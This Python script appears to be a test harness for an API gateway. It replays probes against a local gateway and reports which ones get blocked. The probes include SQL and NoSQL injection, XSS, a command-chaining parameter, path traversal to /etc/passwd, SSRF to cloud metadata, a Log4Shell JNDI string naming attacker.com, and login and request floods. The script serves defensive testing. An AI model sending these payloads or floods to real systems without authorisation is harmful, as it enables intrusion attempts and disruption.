"""
API Gatekeeper — Live Attack Simulator (Module M7).
Replays categorized security attack scenarios and bursts against the running gateway.
Harmless-by-construction test probes used exclusively for defensive demonstration.
"""

from __future__ import annotations

import argparse
import sys
import time
from typing import Any
import httpx


SCENARIOS = [
    {
        "name": "SQLi Probe (Union-based)",
        "category": "sqli",
        "ip": "198.51.100.11",
        "method": "GET",
        "path": "/api/products",
        "params": {"search": "' UNION SELECT 1,2,3--"},
        "headers": {},
        "json": None,
    },
    {
        "name": "XSS Probe (Script tag)",
        "category": "xss",
        "ip": "198.51.100.12",
        "method": "POST",
        "path": "/api/feedback",
        "params": {},
        "headers": {"Content-Type": "application/json"},
        "json": {"product_id": 1, "comment": "<script>alert('xss')</script>"},
    },
    {
        "name": "Command Chaining Probe",
        "category": "cmdi",
        "ip": "198.51.100.13",
        "method": "GET",
        "path": "/api/products",
        "params": {"file": "report.pdf; id"},
        "headers": {},
        "json": None,
    },
    {
        "name": "Path Traversal Probe",
        "category": "traversal",
        "ip": "198.51.100.14",
        "method": "GET",
        "path": "/api/products",
        "params": {"doc": "../../../../etc/passwd"},
        "headers": {},
        "json": None,
    },
    {
        "name": "SSRF Cloud Metadata Probe",
        "category": "ssrf",
        "ip": "198.51.100.15",
        "method": "GET",
        "path": "/api/products",
        "params": {"url": "http://169.254.169.254/latest/meta-data/"},
        "headers": {},
        "json": None,
    },
    {
        "name": "Obfuscated / Double-Encoded Probe",
        "category": "sqli",
        "ip": "198.51.100.16",
        "method": "GET",
        "path": "/api/products",
        "params": {"search": "%2527%2520UNION%2520SELECT%25201%252C2%252C3--"},
        "headers": {},
        "json": None,
    },
    {
        "name": "Scanner User-Agent (sqlmap)",
        "category": "bot",
        "ip": "198.51.100.17",
        "method": "GET",
        "path": "/api/products",
        "params": {"search": "' UNION SELECT 1,2,3--"},
        "headers": {"User-Agent": "sqlmap/1.5.2#stable (http://sqlmap.org)"},
        "json": None,
    },
    {
        "name": "NoSQL Operator Injection",
        "category": "nosql",
        "ip": "198.51.100.18",
        "method": "POST",
        "path": "/api/login",
        "params": {},
        "headers": {"Content-Type": "application/json"},
        "json": {"username": {"$ne": None}, "password": {"$ne": None}},
    },
    {
        "name": "Log4Shell JNDI Lookup",
        "category": "jndi",
        "ip": "198.51.100.19",
        "method": "GET",
        "path": "/api/products",
        "params": {"search": "${jndi:ldap://attacker.com/poc}"},
        "headers": {},
        "json": None,
    },
]


def run_scenario(
    client: httpx.Client,
    base_url: str,
    sc: dict[str, Any],
) -> dict[str, Any]:
    """Execute a single attack scenario and measure latency."""
    headers = dict(sc.get("headers") or {})
    headers["X-Forwarded-For"] = sc["ip"]

    t0 = time.perf_counter()
    try:
        resp = client.request(
            method=sc["method"],
            url=f"{base_url}{sc['path']}",
            params=sc.get("params"),
            headers=headers,
            json=sc.get("json"),
            timeout=5.0,
        )
        lat_ms = (time.perf_counter() - t0) * 1000.0
        status_code = resp.status_code
    except Exception as exc:
        lat_ms = (time.perf_counter() - t0) * 1000.0
        status_code = 0

    blocked = status_code in (403, 429)

    return {
        "name": sc["name"],
        "category": sc["category"],
        "ip": sc["ip"],
        "status": status_code,
        "blocked": blocked,
        "latency_ms": lat_ms,
    }


def run_login_flood(client: httpx.Client, base_url: str) -> dict[str, Any]:
    """Send rapid login requests to trigger login rate limiter (capacity 5)."""
    flood_ip = "198.51.100.20"
    headers = {"X-Forwarded-For": flood_ip, "Content-Type": "application/json"}
    body = {"username": "flood_user", "password": "wrong_password"}

    statuses: list[int] = []
    t0 = time.perf_counter()

    for _ in range(8):
        try:
            r = client.post(f"{base_url}/api/login", headers=headers, json=body, timeout=5.0)
            statuses.append(r.status_code)
        except Exception:
            statuses.append(0)

    lat_ms = (time.perf_counter() - t0) * 1000.0
    blocked_any = 429 in statuses or 403 in statuses
    display_status = 429 if 429 in statuses else (403 if 403 in statuses else (statuses[-1] if statuses else 0))

    return {
        "name": "Login Flood (8 rapid attempts)",
        "category": "ratelimit",
        "ip": flood_ip,
        "status": display_status,
        "blocked": blocked_any,
        "latency_ms": lat_ms,
    }


def run_request_burst(client: httpx.Client, base_url: str) -> dict[str, Any]:
    """Send rapid burst of 30 requests to trigger general rate limiter (capacity 20)."""
    burst_ip = "198.51.100.21"
    headers = {"X-Forwarded-For": burst_ip}

    statuses: list[int] = []
    t0 = time.perf_counter()

    for _ in range(30):
        try:
            r = client.get(f"{base_url}/api/products", headers=headers, timeout=5.0)
            statuses.append(r.status_code)
        except Exception:
            statuses.append(0)

    lat_ms = (time.perf_counter() - t0) * 1000.0
    blocked_any = 429 in statuses or 403 in statuses
    display_status = 429 if 429 in statuses else (403 if 403 in statuses else (statuses[-1] if statuses else 0))

    return {
        "name": "Request Burst (30 rapid GETs)",
        "category": "ratelimit",
        "ip": burst_ip,
        "status": display_status,
        "blocked": blocked_any,
        "latency_ms": lat_ms,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="API Gatekeeper Live Attack Simulator")
    parser.add_argument("--url", default="http://127.0.0.1:8000", help="Gateway URL (default: http://127.0.0.1:8000)")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between scenarios in seconds")
    args = parser.parse_args()

    base_url = args.url.rstrip("/")

    print("\n" + "=" * 76)
    print("             API GATEKEEPER -- LIVE ATTACK SIMULATION             ")
    print("=" * 76)
    print(f"Target Gateway: {base_url}\n")

    results: list[dict[str, Any]] = []

    with httpx.Client() as client:
        # 1. Run standard scenarios
        for sc in SCENARIOS:
            res = run_scenario(client, base_url, sc)
            results.append(res)
            time.sleep(args.delay)

        # 2. Run Login Flood
        time.sleep(args.delay)
        res_flood = run_login_flood(client, base_url)
        results.append(res_flood)

        # 3. Run Request Burst (MUST RUN LAST)
        time.sleep(args.delay)
        res_burst = run_request_burst(client, base_url)
        results.append(res_burst)

    # Print Results Table
    print("+------------------------------------+---------------+--------+----------+-----------+------------+")
    print("| Scenario                           | Client IP     | Status | Blocked? | Category  | Latency    |")
    print("+------------------------------------+---------------+--------+----------+-----------+------------+")
    for r in results:
        status_str = f"HTTP {r['status']}" if r['status'] > 0 else "FAIL"
        blocked_str = "BLOCKED" if r['blocked'] else "ALLOWED"
        print(f"| {r['name']:<34} | {r['ip']:<13} | {status_str:<6} | {blocked_str:<8} | {r['category']:<9} | {r['latency_ms']:>7.2f} ms |")
    print("+------------------------------------+---------------+--------+----------+-----------+------------+")

    # Summary
    total = len(results)
    blocked_count = sum(1 for r in results if r["blocked"])
    avg_latency = sum(r["latency_ms"] for r in results) / total if total > 0 else 0.0
    detection_pct = (blocked_count / total) * 100.0 if total > 0 else 0.0

    print("\nSimulation Summary:")
    print(f"  * Total Scenarios Executed: {total}")
    print(f"  * Total Threats Mitigated:  {blocked_count} / {total} ({detection_pct:.1f}%)")
    print(f"  * Average Attack Latency:   {avg_latency:.2f} ms")
    print("=" * 76 + "\n")


if __name__ == "__main__":
    main()
